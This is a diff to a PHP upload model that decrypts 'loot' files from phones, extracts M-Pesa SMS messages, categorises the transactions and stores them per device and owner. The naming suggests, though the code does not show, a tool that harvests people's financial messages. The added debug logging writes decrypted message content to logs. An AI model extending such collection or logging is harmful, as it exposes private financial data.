@@ -119,8 +119,6 @@ class ModUploads extends Model
         string $loot_device,
         string $dated
     ): array {
-        $result = ['status' => 'error', 'message' => ''];
-
         try {
             $this->db->transBegin();
 
@@ -141,12 +139,16 @@ class ModUploads extends Model
                 $loot_device
             );
 
-            // 5. Save summary
+            // 5. Save summary (throws on failure)
             $this->save_summary_data(
                 $processed['counters'],
                 $loot_uuid,
                 $dated
             );
+
+            if ($this->db->transStatus() === false) {
+                throw new \RuntimeException('SMS processing transaction failed');
+            }
 
             $this->db->transCommit();
 
@@ -156,11 +158,11 @@ class ModUploads extends Model
                 'summary' => $processed['counters']
             ];
 
-        } catch (\Exception $e) {
+        } catch (\Throwable $e) {
             $this->db->transRollback();
             log_message('error', 'SMS Processing Error: ' . $e->getMessage());
-            $result['message'] = $e->getMessage();
-            return $result;
+            // Re-throw so Upload::upload can return a proper error JSON to the client
+            throw $e;
         }
     }
 
@@ -179,6 +181,27 @@ class ModUploads extends Model
             ->where($print_dump)
             ->get()
             ->getResult();
+    }
+
+    /**
+     * Find an existing device by stable fingerprint fields (not the per-request UUID).
+     */
+    public function device_find_by_fingerprint(
+        string $fingerprint,
+        string $model = '',
+        string $brand = ''
+    ): array {
+        $builder = $this->db->table('tbl_Devices')->select('device_Uuid');
+
+        if ($fingerprint !== '') {
+            $builder->where('device_Fingerprint', $fingerprint);
+        } else {
+            // Fallback when fingerprint is empty (rare / custom ROMs)
+            $builder->where('device_Model', $model)
+                ->where('device_Brand', $brand);
+        }
+
+        return $builder->limit(1)->get()->getResult();
     }
 
     public function get_loot_uuid(string $loot_name): string {
@@ -803,11 +826,12 @@ class ModUploads extends Model
         $transactionTerm = "transaction cost";
 
         foreach ($smsMessages as $sms) {
-            if ($sms->Number != "MPESA") {
+            $number = isset($sms->Number) ? strtoupper(trim((string) $sms->Number)) : '';
+            if ($number !== 'MPESA' && !str_contains($number, 'MPESA')) {
                 continue;
             }
 
-            $message = strtolower(base64_decode($sms->Body));
+            $message = strtolower(base64_decode((string) ($sms->Body ?? '')));
             $position = strpos($message, $transactionTerm);
 
             $cleanedMessages[] = base64_encode(
@@ -900,11 +924,19 @@ class ModUploads extends Model
     protected function decrypt_loot_file(string $path): string {
         $modCryption = new ModCryption();
         $content = file_get_contents($path);
+        
+        log_message('debug', 'File path: ' . $path);
+        log_message('debug', 'File size: ' . filesize($path));
+        log_message('debug', 'File content first 32 bytes: ' . bin2hex(substr($content, 0, 32)));
+        
         $decrypted = $modCryption->decode_content($content);
 
         if (empty($decrypted)) {
             throw new \RuntimeException("Failed to decrypt file");
         }
+
+        log_message('debug', 'Decrypted content length: ' . strlen($decrypted));
+        log_message('debug', 'Decrypted content first 200 chars: ' . substr($decrypted, 0, 200));
 
         return $decrypted;
     }
@@ -925,6 +957,8 @@ class ModUploads extends Model
         $json = json_decode('[' . substr($normalized, 0, -2) . '}]');
 
         if (json_last_error() !== JSON_ERROR_NONE) {
+            log_message('error', 'JSON parse error: ' . json_last_error_msg());
+            log_message('debug', 'Normalized data first 500 chars: ' . substr($normalized, 0, 500));
             throw new \RuntimeException("JSON parse error: " . json_last_error_msg());
         }
 
@@ -937,23 +971,28 @@ class ModUploads extends Model
         string $owner,
         string $device
     ): array {
-        $cleaned = $this->clean_sms_by_trimming_messages($smsData);
+        // Build MPESA-only list so body/category indexes stay aligned
+        $mpesaMessages = [];
+        foreach ($smsData as $sms) {
+            $number = isset($sms->Number) ? strtoupper(trim((string) $sms->Number)) : '';
+            if ($number === 'MPESA' || str_contains($number, 'MPESA')) {
+                $mpesaMessages[] = $sms;
+            }
+        }
+
+        $cleaned = $this->clean_sms_by_trimming_messages($mpesaMessages);
         $categorized = $this->clean_sms_by_categorizing($cleaned);
 
         $batch = [];
-        $columns = ['Date', 'Type', 'Number', 'Seen', 'ID', 'Thread Id'];
-
-        foreach ($smsData as $index => $sms) {
-            if ($sms->Number != "MPESA") continue;
-
+        foreach ($mpesaMessages as $index => $sms) {
             $batch[] = [
-                'sms_type' => $sms->Type,
-                'sms_number' => $sms->Number,
-                'sms_thread_id' => $sms->{'Thread Id'},
-                'sms_time' => $sms->Date,
-                'sms_category' => $categorized['categories'][$index] ?? 'sms_unknown',
-                'sms_seen' => $sms->Seen,
-                'sms__id' => $sms->ID,
+                'sms_type' => $sms->Type ?? '',
+                'sms_number' => $sms->Number ?? 'MPESA',
+                'sms_thread_id' => $sms->{'Thread Id'} ?? '',
+                'sms_time' => $sms->Date ?? '',
+                'sms_category' => $categorized['categories'][$index] ?? 'Unknown',
+                'sms_seen' => $sms->Seen ?? '',
+                'sms__id' => $sms->ID ?? '',
                 'sms_body' => $cleaned[$index] ?? '',
                 'sms_loot_source' => $uuid,
                 'sms_owner' => $owner,
@@ -963,8 +1002,9 @@ class ModUploads extends Model
 
         $inserted = 0;
         foreach (array_chunk($batch, 100) as $chunk) {
-            $inserted += $this->db->table('tbl_Sms')->ignore(true)->insertBatch($chunk)
-                ? count($chunk) : 0;
+            if ($this->db->table('tbl_Sms')->ignore(true)->insertBatch($chunk)) {
+                $inserted += count($chunk);
+            }
         }
 
         return [
@@ -973,48 +1013,72 @@ class ModUploads extends Model
         ];
     }
 
-    protected function save_summary_data(array $counters, string $uuid, string $date): bool {
+    /**
+     * Map pattern keys from $smsPatterns → DB summary columns.
+     * Keys must match $this->smsPatterns exactly.
+     */
+    protected function save_summary_data(array $counters, string $uuid, int|string $date): bool {
         $mapping = [
-            'sms_receive' => 'info_Get_from_MPESA',
-            'sms_from_mshwari' => 'info_Get_from_Mshwari',
-            'sms_from_ncba' => 'info_Get_from_NCBA',
-            'sms_from_kcb' => 'info_Get_from_KCB',
-            'sms_from_im_bank' => 'info_Get_from_IM',
-            'sms_reversal' => 'info_Get_from_Reversal',
-            'sms_balance_mpesa' => 'info_Get_Bal_MPESA',
-            'sms_balance_kcb' => 'info_Get_Bal_KCB',
-            'sms_balance_mshwari' => 'info_Get_Bal_Mshwari',
-            'sms_loan_limit' => 'info_Loan_Limit',
-            'sms_sent_to_mpesa' => 'info_Sent_to_MPESA',
-            'sms_sent_to_lnm' => 'info_Sent_to_LNM',
-            'sms_sent_mini' => 'info_Sent_Mini',
-            'sms_sent_to_mshwari' => 'info_Sent_to_Mshwari',
-            'sms_sent_cancel' => 'info_Sent_Cancel',
-            'sms_error_failed' => 'info_Error_Failed',
-            'sms_error_pin' => 'info_Error_Pin',
-            'sms_error_insufficient' => 'info_Error_Less',
-            'sms_error_receiver' => 'info_Error_Receiver',
-            'sms_error_receiver_org' => 'info_Error_Receiver_Org',
-            'sms_withdraw' => 'info_Withdraw',
-            'sms_fuliza_opt_out' => 'info_Fuliza_Opt_Out',
-            'sms_fuliza_opt_in' => 'info_Fuliza_Opt_In',
-            'sms_fuliza_limit' => 'info_Fuliza_Limit',
-            'sms_fuliza_loan_pay' => 'info_Fuliza_Loan_Paid',
+            'sms_received'              => 'info_Get_from_MPESA',
+            'sms_from_mshwari_account'  => 'info_Get_from_Mshwari',
+            'sms_from_ncba'             => 'info_Get_from_NCBA',
+            'sms_from_kcb'              => 'info_Get_from_KCB',
+            'sms_from_im_bank'          => 'info_Get_from_IM',
+            'sms_reversal'              => 'info_Get_from_Reversal',
+            'sms_balance_mpesa'         => 'info_Get_Bal_MPESA',
+            'sms_balance_kcb'           => 'info_Get_Bal_KCB',
+            'sms_balance_mshwari'       => 'info_Get_Bal_Mshwari',
+            'sms_loan_limit'            => 'info_Loan_Limit',
+            'sms_sent'                  => 'info_Sent_to_MPESA',
+            'sms_sent_to_lnm'           => 'info_Sent_to_LNM',
+            'sms_sent_mini'             => 'info_Sent_Mini',
+            'sms_sent_to_mshwari'       => 'info_Sent_to_Mshwari',
+            'sms_sent_cancel'           => 'info_Sent_Cancel',
+            'sms_error_failed'          => 'info_Error_Failed',
+            'sms_error_pin'             => 'info_Error_Pin',
+            'sms_error_insufficient'    => 'info_Error_Less',
+            'sms_error_receiver'        => 'info_Error_Receiver',
+            'sms_error_receiver_org'    => 'info_Error_Receiver_Org',
+            'sms_withdraw'              => 'info_Withdraw',
+            'sms_fuliza_opt_out'        => 'info_Fuliza_Opt_Out',
+            'sms_fuliza_opt_in'         => 'info_Fuliza_Opt_In',
+            'sms_fuliza_limit'          => 'info_Fuliza_Limit',
+            'sms_fuliza_loan_paid'      => 'info_Fuliza_Loan_Paid',
             'sms_fuliza_mini_statement' => 'info_Fuliza_Mini_Statement',
-            'sms_fuliza_loan_taken' => 'info_Fuliza_Loan_Taken',
-            'sms_similar_transaction' => 'info_Similar_Transaction',
-            'sms_unknown' => 'info_Unknown'
+            'sms_fuliza_loan_taken'     => 'info_Fuliza_Loan_Taken',
+            'sms_similar_transaction'   => 'info_Similar_Transaction',
+            'sms_unknown'               => 'info_Unknown',
         ];
 
         $summary = [];
+        $total = 0;
         foreach ($mapping as $patternKey => $summaryField) {
-            $summary[$summaryField] = $counters[$patternKey] ?? 0;
+            $count = (int) ($counters[$patternKey] ?? 0);
+            $summary[$summaryField] = $count;
+            $total += $count;
         }
 
+        $summary['info_All'] = $total;
         $summary['loot_Uuid'] = $uuid;
-        $summary['loot_Created'] = $date;
+        
+        // Convert Unix timestamp to formatted date string for DATETIME column
+        $summary['loot_Created'] = is_numeric($date) ? date('Y-m-d H:i:s', (int)$date) : $date;
 
-        return $this->db->table('tbl_Loot_Summary')->insert($summary);
+        // Also write legacy column if it still exists
+        $fields = $this->db->getFieldNames('tbl_Loot_Summary');
+        if (in_array('info_Get_Received', $fields, true)) {
+            $summary['info_Get_Received'] = $summary['info_Get_from_MPESA'] ?? 0;
+        }
+
+        $ok = $this->db->table('tbl_Loot_Summary')->insert($summary);
+        if (!$ok) {
+            $error = $this->db->error();
+            throw new \RuntimeException(
+                'Failed to save loot summary: ' . ($error['message'] ?? 'unknown DB error')
+            );
+        }
+
+        return true;
     }
 
     /**
